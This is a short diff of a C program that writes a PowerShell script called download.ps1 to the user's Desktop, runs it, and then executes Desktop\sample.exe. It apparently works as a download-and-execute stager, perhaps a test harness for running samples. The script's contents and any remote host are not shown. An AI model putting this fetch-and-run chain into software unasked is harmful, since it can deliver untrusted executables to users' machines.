@@ -5,15 +5,18 @@
 
 
 int main() {
-    char *download_script_filename = ".\\download.ps1";
-    write_string(download_script_filename, download_script);
-    int return_val = run_powershell_script(download_script_filename);
+    const size_t bufferLen = 300;
+    char *userProfilePath = getenv("UserProfile");
+
+    char download_script_path[bufferLen];
+    snprintf(download_script_path, bufferLen, "%s\\Desktop\\download.ps1", userProfilePath);
+    write_string(download_script_path, download_script);
+    int return_val = run_powershell_script(download_script_path);
     if (return_val != 0) {
         return return_val;
     }
-    const size_t bufferLen = 200;
+    
     char samplePath[bufferLen];
-    char *userProfilePath = getenv("UserProfile");
     snprintf(samplePath, bufferLen, "%s\\Desktop\\sample.exe", userProfilePath);
     return run_command(samplePath);
 }
